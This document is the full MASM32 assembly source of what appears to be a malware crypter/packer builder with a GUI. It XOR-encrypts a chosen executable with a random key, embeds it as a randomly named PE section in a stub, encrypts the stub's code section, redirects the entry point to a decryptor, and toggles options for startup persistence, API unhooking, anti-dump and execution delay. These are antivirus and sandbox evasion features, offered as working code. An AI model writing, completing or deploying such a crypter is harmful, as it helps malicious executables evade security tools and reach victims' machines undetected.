.386
.model flat, stdcall
option casemap :none

include windows.inc
include kernel32.inc
include user32.inc
include Comctl32.inc
include shell32.inc
include comdlg32.inc
include shlwapi.inc
include gdi32.inc
include  WaveObject.asm
includelib kernel32.lib
includelib user32.lib
includelib Comctl32.lib
includelib shell32.lib
includelib comdlg32.lib
includelib shlwapi.lib
includelib gdi32.lib

IDC_BTNPACK      equ 1004
IDC_EDITPATH     equ 1003
IDC_BTNOPEN      equ 1005
IDC_IMG1      equ 105
ERROR_MAPPING_FAILED    equ 3
ERROR_INVALID_PE        equ 4
ERROR_NO_SECTIONS       equ 5

DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM

.const
    IDD_DIALOG1    equ 101

.data
    szTextSection   db '.text',0,0,0
    szStubSection   db '.stub',0,0,0
    XOR_KEY         db 0
    
    stub    db 060h
            db 0BFh, 0, 0, 0, 0
            db 0B9h, 0, 0, 0, 0
            db 0B0h, 0
            db 030h, 007h
            db 047h
            db 0E2h, 0FBh
            db 061h
            db 0E9h, 0, 0, 0, 0
    stub_size equ $ - stub
    original_entry  dd 0
    baseAddr        dd 0
    
    szBitmapPath db "Res\header.bmp",0
    szFilter       db "Executable Files (*.exe)", 0, "*.exe", 0, 0
    ofn            OPENFILENAME <>
    sfn            OPENFILENAME <>
    szFile         db 260 dup(0)
    szSaveFile     db 260 dup(0)
    szFileName     db 260 dup(0)
    szExe          db ".exe", 0
    szMsg          db "Please select a file first!", 0
    szCaption      db "Error", 0
    szSuccess      db "Successfully saved file to: ", 0
    szSuccessMsg   db 512 dup(0)
    szSuccessCaption db "Success", 0
    szSaveTitle    db "Save Packed File", 0
    startInfo      STARTUPINFO <?>
    procInfo       PROCESS_INFORMATION <?>
    szCurrentDir   db 260 dup(0)
    szWorkingDir   db 260 dup(0)
    szTempFile db "stub.tmp", 0
    szTempFile2 db "stub2.tmp", 0
    stub_file    db "stub.bin", 0
    str_startup_nop   db "STARTUP_NOP", 0
    str_startup_yes   db "STARTUP_YES", 0
    str_unhook_nop    db "UNHOOK_NOP", 0
    str_unhook_yes    db "UNHOOK_YES", 0
    str_antidump_nop  db "ANTIDUMP_NOP", 0
    str_antidump_yes  db "ANTIDUMP_YES", 0
    str_delay_nop     db "DELAY_NOP", 0
    str_delay_yes     db "DELAY_YES", 0
    str_secret        db "SECRET", 0
    output_file db "payload.xyris", 0
    
Rndm            dd    0
B32Chars        db    "ABCDEFGHIJKLMNOPQRSTUVXYZ",0

.data?
    stub_copy db 24 dup(?)
    stub_path        dd ?
    hInstance      dd ?
    hWnd           dd ?
    input_data dd ?
    input_size dd ?
    output_buffer dd ?
    file_buffer db 10000h dup(?)
    input_payload dd ?
    payload_size dd ?
    stWaveObj   WAVE_OBJECT <?>
    xWin dd ?
    hBitmap dd ?
    bitmp dd ?
    szKey    db    ?
    szSection    db    ?
    szSection2   db    ?

.code
start:
    invoke GetModuleHandle, NULL
    mov hInstance, eax
    invoke InitCommonControls
    invoke DialogBoxParam, hInstance, IDD_DIALOG1, NULL, addr DlgProc, NULL
    invoke ExitProcess, 0

;Randomize and GenRandomNumbers -> https://github.com/Xyl2k/Xylitol-MASM32-snippets/blob/master/Random/Numbers-letters/keygen.asm
Randomize PROC uses ecx
    invoke    GetTickCount
    add Rndm,eax
    add Rndm,eax
    add Rndm,'abcd'
    Rol Rndm,1
    mov eax,Rndm
    Ret
Randomize ENDP

GenRandomNumbers    PROC uses ebx    pIn:DWORD,pLen:DWORD
    mov edi,pIn
    mov ebx,pLen
    .repeat
        invoke    Randomize
        mov ecx,26            
        xor edx,edx
        idiv ecx
        movzx eax,byte ptr [edx+B32Chars]
        stosb
        dec ebx
    .until zero?
    Ret
GenRandomNumbers ENDP

align_to PROC val:DWORD, alignment:DWORD
    mov eax, val
    add eax, alignment
    dec eax
    xor edx, edx
    div alignment
    mul alignment
    ret
align_to ENDP

read_file PROC filepath:DWORD
    LOCAL hFile:HANDLE
    LOCAL bytes_read:DWORD
    LOCAL hHeap:HANDLE
    
    invoke GetProcessHeap
    mov hHeap, eax
    
    invoke CreateFileA, filepath, GENERIC_READ, FILE_SHARE_READ,\
                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    
    .if eax == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif
    mov hFile, eax
    
    invoke GetFileSize, hFile, NULL
    mov input_size, eax
    
    invoke HeapAlloc, hHeap, HEAP_ZERO_MEMORY, input_size
    .if eax == 0
        invoke CloseHandle, hFile
        xor eax, eax
        ret
    .endif
    mov input_data, eax
    
    invoke ReadFile, hFile, input_data, input_size,\
                    addr bytes_read, NULL
    
    mov eax, bytes_read
    cmp eax, input_size
    je read_ok
    
    invoke HeapFree, hHeap, 0, input_data
    invoke CloseHandle, hFile
    xor eax, eax
    ret
    
read_ok:
    invoke CloseHandle, hFile
    mov eax, 1
    ret
read_file ENDP

add_section PROC uses ebx esi edi,
    target_file:DWORD, section_name:DWORD
    
    LOCAL hFile:HANDLE
    LOCAL hMapping:HANDLE
    LOCAL pMapping:DWORD
    LOCAL section_align:DWORD
    LOCAL file_align:DWORD
    LOCAL last_section:DWORD
    LOCAL new_section:DWORD
    LOCAL file_size:DWORD
    LOCAL aligned_size:DWORD
    LOCAL nt_header:DWORD
    LOCAL dos_header:DWORD
    
    invoke CreateFileA, target_file, 
           GENERIC_READ or GENERIC_WRITE,
           FILE_SHARE_READ or FILE_SHARE_WRITE, 
           NULL,
           OPEN_EXISTING, 
           FILE_ATTRIBUTE_NORMAL, 
           NULL
    
    .if eax == INVALID_HANDLE_VALUE
        mov eax, ERROR_INVALID_HANDLE
        ret
    .endif
    mov hFile, eax
    
    invoke GetFileSize, hFile, NULL
    .if eax == INVALID_FILE_SIZE
        invoke CloseHandle, hFile
        mov eax, ERROR_INVALID_DATA
        ret
    .endif
    mov file_size, eax
    
    mov eax, input_size
    add eax, 4096h
    add eax, file_size
    mov aligned_size, eax
    
    invoke CreateFileMappingA, hFile, 
           NULL, 
           PAGE_READWRITE, 
           0, 
           aligned_size, 
           NULL
    .if eax == 0
        invoke CloseHandle, hFile
        mov eax, ERROR_MAPPING_FAILED
        ret
    .endif
    mov hMapping, eax
    
    invoke MapViewOfFile, hMapping, 
           FILE_MAP_ALL_ACCESS, 
           0, 
           0, 
           0
    .if eax == 0
        invoke CloseHandle, hMapping
        invoke CloseHandle, hFile
        mov eax, ERROR_MAPPING_FAILED
        ret
    .endif
    mov pMapping, eax
    mov dos_header, eax
    
    mov ebx, dos_header
    assume ebx:PTR IMAGE_DOS_HEADER
    movzx eax, word ptr [ebx].e_magic
    cmp ax, IMAGE_DOS_SIGNATURE
    jne invalid_pe
    
    mov eax, [ebx].e_lfanew
    add ebx, eax
    mov nt_header, ebx
    assume ebx:PTR IMAGE_NT_HEADERS
    
    mov eax, [ebx].Signature
    cmp eax, IMAGE_NT_SIGNATURE
    jne invalid_pe
    
    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
    .if ecx == 0
        invoke CloseHandle, hMapping
        invoke CloseHandle, hFile
        mov eax, ERROR_NO_SECTIONS
        ret
    .endif
    dec ecx
    imul ecx, 28h
    lea eax, [ebx + 0F8h]
    add eax, ecx
    mov last_section, eax
    
    mov eax, [ebx].OptionalHeader.SectionAlignment
    mov section_align, eax
    mov eax, [ebx].OptionalHeader.FileAlignment
    mov file_align, eax
    
    mov edi, last_section
    add edi, sizeof IMAGE_SECTION_HEADER
    mov new_section, edi
    
    push edi
    lea esi, section_name
    mov ecx, 8
    rep movsb
    pop edi
    
    assume edi:PTR IMAGE_SECTION_HEADER
    mov eax, input_size
    mov [edi].Misc.VirtualSize, eax
    
    mov esi, last_section
    assume esi:PTR IMAGE_SECTION_HEADER
    mov edx, [esi].VirtualAddress
    add edx, [esi].Misc.VirtualSize
    invoke align_to, edx, section_align
    mov [edi].VirtualAddress, eax
    
    mov eax, input_size
    invoke align_to, eax, file_align
    mov [edi].SizeOfRawData, eax
    
    mov esi, last_section
    assume esi:PTR IMAGE_SECTION_HEADER
    mov eax, [esi].PointerToRawData
    add eax, [esi].SizeOfRawData
    invoke align_to, eax, file_align
    mov [edi].PointerToRawData, eax
    
    mov eax, IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ
    mov [edi].Characteristics, eax
    
    mov ebx, nt_header
    assume ebx:PTR IMAGE_NT_HEADERS
    
    movzx eax, word ptr [ebx].FileHeader.NumberOfSections
    inc ax
    mov [ebx].FileHeader.NumberOfSections, ax
    
    mov eax, [edi].VirtualAddress
    add eax, [edi].Misc.VirtualSize
    invoke align_to, eax, section_align
    mov [ebx].OptionalHeader.SizeOfImage, eax
    
    mov esi, input_data
    mov edi, pMapping
    mov ebx, new_section
    assume ebx:PTR IMAGE_SECTION_HEADER
    add edi, [ebx].PointerToRawData
    mov ecx, input_size
    rep movsb
    
    mov eax, input_size
    xor edx, edx
    div file_align
    .if edx != 0
        mov ecx, file_align
        sub ecx, edx
        xor al, al
        rep stosb
    .endif
    
    invoke FlushViewOfFile, pMapping, 0
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    
    mov eax, 1
    ret

invalid_pe:
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    mov eax, ERROR_INVALID_PE
    ret

add_section ENDP

strlen PROC string:DWORD
    LOCAL len:DWORD
    mov len, 0
    mov edx, string
@count_loop:
    mov al, byte ptr [edx]
    test al, al
    jz @done
    inc edx
    inc len
    jmp @count_loop
@done:
    mov eax, len
    ret
strlen ENDP

replace_string PROC uses esi edi dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
replace_string ENDP

process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, replace:DWORD
    LOCAL searchLen:DWORD
    LOCAL found:DWORD
    
    mov found, 0

    invoke strlen, search
    mov searchLen, eax
    
    mov esi, data
    mov ecx, dataSize
    sub ecx, searchLen
    inc ecx
    
@scan_loop:
    push ecx
    mov edi, search
    mov ecx, searchLen
    push esi
    repe cmpsb
    pop esi
    je @found_pattern
    pop ecx
    inc esi
    loop @scan_loop
    jmp @pattern_done
    
@found_pattern:
    pop ecx
    
    mov eax, esi
    sub eax, data

    invoke replace_string, esi, replace, searchLen

    mov eax, esi
    sub eax, data
    mov found, 1
    
@pattern_done:
    mov eax, found
    ret
process_pattern ENDP

pack_pe_file PROC uses ebx esi edi inputPath:DWORD, outputPath:DWORD
    LOCAL hFile:HANDLE
    LOCAL hMapping:HANDLE
    LOCAL pMapping:DWORD
    LOCAL textSection:DWORD
    LOCAL stubSection:DWORD
    LOCAL nt_header:DWORD
    LOCAL dos_header:DWORD
    
    invoke CopyFileA, inputPath, outputPath, FALSE
test eax, eax
    jz failed
    
    invoke CreateFileA, outputPath, GENERIC_READ or GENERIC_WRITE,\
                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    cmp eax, INVALID_HANDLE_VALUE
    je failed
    mov hFile, eax
    
    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
    test eax, eax
    jz close_file
    mov hMapping, eax
    
    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
    test eax, eax
    jz close_mapping
    mov pMapping, eax
    mov dos_header, eax
    
    mov ebx, pMapping
    assume ebx:PTR IMAGE_DOS_HEADER
    movzx eax, word ptr [ebx].e_magic
    cmp ax, IMAGE_DOS_SIGNATURE
    jne cleanup
    
    mov eax, [ebx].e_lfanew
    add ebx, eax
    mov nt_header, ebx
    assume ebx:PTR IMAGE_NT_HEADERS
    
    mov eax, [ebx].OptionalHeader.ImageBase
    mov baseAddr, eax
    mov eax, [ebx].OptionalHeader.AddressOfEntryPoint
    mov original_entry, eax
    
    lea esi, [ebx + sizeof IMAGE_NT_HEADERS]
    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
    
find_text_section:
    push ecx
    push esi
    mov edi, offset szTextSection
    mov ecx, 5
    repe cmpsb
    pop esi
    pop ecx
    je found_text_section
    add esi, sizeof IMAGE_SECTION_HEADER
    loop find_text_section
    jmp cleanup
    
found_text_section:
    mov textSection, esi
    assume esi:PTR IMAGE_SECTION_HEADER
    
    lea esi, stub
    lea edi, stub_copy
    mov ecx, stub_size
    rep movsb
    mov al, byte ptr [XOR_KEY]
    mov byte ptr [stub_copy + 12], al
    
    mov esi, textSection
    assume esi:PTR IMAGE_SECTION_HEADER
    mov eax, [esi].VirtualAddress
    add eax, baseAddr
    mov edi, offset stub_copy
    add edi, 2
    mov dword ptr [edi], eax
    
    mov eax, [esi].SizeOfRawData
    add edi, 5
    mov dword ptr [edi], eax
    
    or dword ptr [esi].Characteristics, IMAGE_SCN_MEM_WRITE
    
    mov edi, pMapping
    add edi, [esi].PointerToRawData
    mov ecx, [esi].SizeOfRawData
encrypt_loop:
    mov al, byte ptr [XOR_KEY]
    xor byte ptr [edi], al
    inc edi
    loop encrypt_loop
    
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    
    lea eax, stub_copy
    mov input_data, eax
    mov eax, stub_size
    mov input_size, eax
    
    invoke add_section, outputPath,addr szSection
    test eax, eax
    jz failed
    
    invoke CreateFileA, outputPath, GENERIC_READ or GENERIC_WRITE,\
                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    
    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
    mov hMapping, eax
    
    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
    mov pMapping, eax
    
    mov ebx, pMapping
    assume ebx:PTR IMAGE_DOS_HEADER
    mov eax, [ebx].e_lfanew
    add ebx, eax
    mov nt_header, ebx
    assume ebx:PTR IMAGE_NT_HEADERS
    
    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
    dec ecx
    lea ebx, [ebx + sizeof IMAGE_NT_HEADERS]
    imul eax, ecx, sizeof IMAGE_SECTION_HEADER
    add ebx, eax
    mov stubSection, ebx
    
    mov ebx, stubSection
    assume ebx:PTR IMAGE_SECTION_HEADER
    mov eax, [ebx].VirtualAddress
    add eax, stub_size
    mov ecx, eax
    mov eax, original_entry
    sub eax, ecx
    
    mov edi, pMapping
    add edi, [ebx].PointerToRawData
    add edi, stub_size
    sub edi, 4
    mov dword ptr [edi], eax
    
    mov ebx, nt_header
    assume ebx:PTR IMAGE_NT_HEADERS
    mov esi, stubSection
    assume esi:PTR IMAGE_SECTION_HEADER
    mov edx, [esi].VirtualAddress
    mov [ebx].OptionalHeader.AddressOfEntryPoint, edx
    
    invoke FlushViewOfFile, pMapping, 0
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    
    mov eax, 1
    ret

close_mapping:
    invoke CloseHandle, hMapping
    
close_file:
    invoke CloseHandle, hFile
    
cleanup:
    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    invoke CloseHandle, hFile
    xor eax, eax
    ret
    
failed:
    xor eax, eax
    ret

pack_pe_file ENDP

scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD, antidump:DWORD,delay:DWORD, key:DWORD
    LOCAL hMapping:HANDLE
    LOCAL fileData:DWORD
    LOCAL fileSize:DWORD
    LOCAL found:DWORD
    
    mov found, 0
    
    invoke GetFileSize, hFile, NULL
    mov fileSize, eax
    
    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
    mov hMapping, eax

    invoke MapViewOfFile, hMapping, FILE_MAP_WRITE, 0, 0, 0
    .if eax == NULL
        invoke CloseHandle, hMapping
        ret
    .endif
    mov fileData, eax
    
    .if startup
        invoke process_pattern, fileData, fileSize,\
               offset str_startup_nop, offset str_startup_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if unhook
        invoke process_pattern, fileData, fileSize,\
               offset str_unhook_nop, offset str_unhook_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if antidump
        invoke process_pattern, fileData, fileSize,\
               offset str_antidump_nop, offset str_antidump_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if delay
        invoke process_pattern, fileData, fileSize,\
               offset str_delay_nop, offset str_delay_yes
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    .if key != 0
        invoke process_pattern, fileData, fileSize,\
               offset str_secret, key
        .if eax == 1
            mov found, 1
        .endif
    .endif
    
    invoke FlushViewOfFile, fileData, 0
    invoke UnmapViewOfFile, fileData
    invoke CloseHandle, hMapping
    
    mov eax, found
    ret
scan_and_replace ENDP

CopyMemory PROC uses edi esi ecx dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
CopyMemory ENDP

Decrypt PROC uses eax esi edi ebx section:DWORD, size_var:DWORD, outBuffer:DWORD
    LOCAL currentPos:DWORD
    LOCAL remainingBytes:DWORD
    LOCAL currentChunk:DWORD
    LOCAL keyIndex:DWORD
    LOCAL bytesProcessed:DWORD
    LOCAL buffer[4096]:BYTE
    
    invoke GetTickCount
    mov ecx, 255
    xor edx, edx
    div ecx
    inc edx
    mov byte ptr [XOR_KEY], dl
    
    mov esi, section
    mov keyIndex, 0
    mov eax, size_var
    mov remainingBytes, eax
    mov eax, outBuffer
    mov currentPos, eax
    mov bytesProcessed, 0
    
    .while remainingBytes > 0
        mov eax, remainingBytes
        .if eax > 4096
            mov eax, 4096
        .endif
        mov currentChunk, eax
        
        mov edx, keyIndex
        mov ecx, currentChunk
        lea edi, buffer
        
        .while ecx > 0
            mov al, [esi]
            xor al, byte ptr szKey[edx]
            mov [edi], al
            
            inc esi
            inc edi
            inc edx
            .if edx >= 6
                xor edx, edx
            .endif
            dec ecx
        .endw
        
        mov keyIndex, edx
        
        invoke CopyMemory, currentPos, addr buffer, currentChunk
        
        mov eax, currentChunk
        add currentPos, eax
        add bytesProcessed, eax
        sub remainingBytes, eax
    .endw
    ret
Decrypt ENDP

save_file PROC filepath:DWORD, buffer:DWORD, size_val:DWORD
    LOCAL hFile:HANDLE
    LOCAL bytes_written:DWORD
    
    invoke CreateFileA, filepath, GENERIC_WRITE, 0, NULL,\
                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    
    .if eax == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif
    mov hFile, eax
    
    invoke WriteFile, hFile, buffer, size_val,\
                     addr bytes_written, NULL
                     
    invoke CloseHandle, hFile
    mov eax, 1
    ret
save_file ENDP

DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
   LOCAL wID:WORD
   LOCAL hFile:HANDLE
   LOCAL bytes_read:DWORD
   LOCAL startup:DWORD
   LOCAL unhook:DWORD
   LOCAL delay:DWORD
   LOCAL antidump:DWORD
   LOCAL hHeap:HANDLE
   LOCAL hBit:HANDLE
   LOCAL @stPs:PAINTSTRUCT
   LOCAL @hDc:HDC 
   LOCAL @stRect:RECT
   LOCAL hMemDC:HDC
   LOCAL @stBmp:BITMAP
   
   mov eax, uMsg
   .if eax == WM_INITDIALOG
       push hWin
       pop hWnd
  
       invoke LoadImage, NULL, addr szBitmapPath, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE or LR_DEFAULTSIZE
       .if eax != NULL
           mov hBitmap, eax  
           invoke GetDlgItem, hWin, IDC_IMG1
           push hBitmap
           invoke _WaveInit, addr stWaveObj, eax, hBitmap, 25, 0
           .if eax
               call _Quit
           .endif
           pop hBitmap
           invoke _WaveEffect, addr stWaveObj, 1, 5, 4, 293
       .endif
       
   .elseif eax == WM_PAINT
       invoke BeginPaint, hWin, addr @stPs
       mov @hDc, eax
       invoke CreateCompatibleDC, @hDc
       mov hMemDC, eax
       invoke SelectObject, hMemDC, hBitmap
       invoke GetClientRect, hWin, addr @stRect
       invoke DeleteDC, hMemDC
       invoke _WaveUpdateFrame, addr stWaveObj, eax, TRUE
       invoke EndPaint, hWin, addr @stPs
       
   .elseif eax == WM_COMMAND
       mov eax, wParam
       mov wID, ax
       
       .if wID == IDC_BTNOPEN
           invoke GenRandomNumbers,addr szKey, 6
           invoke GenRandomNumbers,addr szSection, 6
     	   invoke GenRandomNumbers,addr szSection2, 6
           mov ofn.lStructSize, sizeof OPENFILENAME
           push hWin
           pop ofn.hwndOwner
           push hInstance
           pop ofn.hInstance
           mov ofn.lpstrFilter, offset szFilter
           mov ofn.lpstrFile, offset szFile
           mov ofn.nMaxFile, sizeof szFile
           mov ofn.Flags, OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST or OFN_HIDEREADONLY
           
           invoke GetOpenFileName, addr ofn
           .if eax != 0
               invoke SetDlgItemText, hWin, IDC_EDITPATH, addr szFile
           .endif
           
       .elseif wID == IDC_BTNPACK
           invoke GetDlgItemText, hWin, IDC_EDITPATH, addr szFile, sizeof szFile
           .if eax == 0
               invoke MessageBox, hWin, addr szMsg, addr szCaption, MB_ICONERROR
           .else
               invoke read_file, addr szFile  
               .if eax == 0
                   jmp @process_done
               .endif

               invoke GetProcessHeap
               mov hHeap, eax
               
               invoke HeapAlloc, hHeap, HEAP_ZERO_MEMORY, input_size
               mov output_buffer, eax
               
               invoke Decrypt, input_data, input_size, output_buffer
               invoke save_file, addr output_file, output_buffer, input_size
               
               invoke HeapFree, hHeap, 0, output_buffer
               invoke HeapFree, hHeap, 0, input_data

               invoke CopyFileA, addr stub_file, addr szTempFile, FALSE
               .if eax == 0
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif

               invoke CreateFileA, addr szTempFile,\
                      GENERIC_READ or GENERIC_WRITE,\
                      FILE_SHARE_READ or FILE_SHARE_WRITE,\
                      NULL,\
                      OPEN_EXISTING,\
                      FILE_ATTRIBUTE_NORMAL,\
                      NULL
               
               .if eax == INVALID_HANDLE_VALUE
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif
               mov hFile, eax

               invoke IsDlgButtonChecked, hWin,1007
               .if eax == BST_CHECKED
                   mov startup, 1
               .else
                   mov startup, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1008
               .if eax == BST_CHECKED
                   mov unhook, 1
               .else
                   mov unhook, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1009
               .if eax == BST_CHECKED
                   mov delay, 1
               .else
                   mov delay, 0
               .endif

               invoke IsDlgButtonChecked, hWin, 1010
               .if eax == BST_CHECKED
                   mov antidump, 1
               .else
                   mov antidump, 0
               .endif

               invoke scan_and_replace, hFile,\
                           startup,\
                           unhook,\
                           antidump,\
                           delay,\
                           addr szKey

               invoke CloseHandle, hFile

               invoke read_file, addr output_file
               .if eax == 0
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif
               
               invoke add_section, addr szTempFile, addr szSection2
               
               invoke pack_pe_file, addr szTempFile, addr szTempFile2
               .if eax == 0
                   invoke GetProcessHeap
                   push eax
                   invoke HeapFree, eax, 0, input_data
                   pop eax
                   invoke DeleteFileA, addr szTempFile
                   invoke DeleteFileA, addr szTempFile2
                   invoke DeleteFileA, addr output_file
                   jmp @process_done
               .endif

               mov sfn.lStructSize, sizeof OPENFILENAME
               push hWin
               pop sfn.hwndOwner
               push hInstance
               pop sfn.hInstance
               mov sfn.lpstrFilter, offset szFilter
               mov sfn.lpstrFile, offset szSaveFile
               mov sfn.nMaxFile, sizeof szSaveFile
               mov sfn.lpstrDefExt, offset szExe + 1
               mov sfn.Flags, OFN_PATHMUSTEXIST or OFN_OVERWRITEPROMPT
               mov sfn.lpstrTitle, offset szSaveTitle
               mov byte ptr [szSaveFile], 0
               
               invoke GetSaveFileName, addr sfn
               .if eax != 0
                   invoke CopyFileA, addr szTempFile2, addr szSaveFile, FALSE
                   invoke DeleteFileA, addr szTempFile2
                   invoke DeleteFileA, addr szTempFile
                   invoke lstrcpy, addr szSuccessMsg, addr szSuccess
                   invoke lstrcat, addr szSuccessMsg, addr szSaveFile
                   invoke MessageBox, hWin, addr szSuccessMsg, addr szSuccessCaption, MB_ICONINFORMATION
               .else
                   invoke DeleteFileA, addr szTempFile
               .endif
           .endif

       @process_done:
       .endif

   .elseif eax == WM_PAINT
       invoke BeginPaint, hWin, addr @stPs
       mov @hDc, eax
       invoke CreateCompatibleDC, @hDc
       mov hMemDC, eax
       invoke SelectObject, hMemDC, hBitmap
       invoke GetClientRect, hWin, addr @stRect
       invoke DeleteDC, hMemDC
       invoke _WaveUpdateFrame, addr stWaveObj, eax, TRUE
       invoke EndPaint, hWin, addr @stPs
       
   .elseif eax == WM_LBUTTONDOWN
       mov eax, lParam
       movzx ecx, ax
       shr eax, 16
       invoke _WaveDropStone, addr stWaveObj, ecx, eax, 2, 256
       
   .elseif eax == WM_CLOSE
       invoke _WaveFree, addr stWaveObj
       invoke DeleteObject, hBitmap
       invoke EndDialog, hWin, 0
       
   .else
       mov eax, FALSE
       ret
   .endif
   
   mov eax, TRUE
   ret

DlgProc ENDP

_Quit proc
   invoke _WaveFree, addr stWaveObj
   invoke DestroyWindow, hWnd
   invoke PostQuitMessage, NULL
   ret
_Quit ENDP

END start
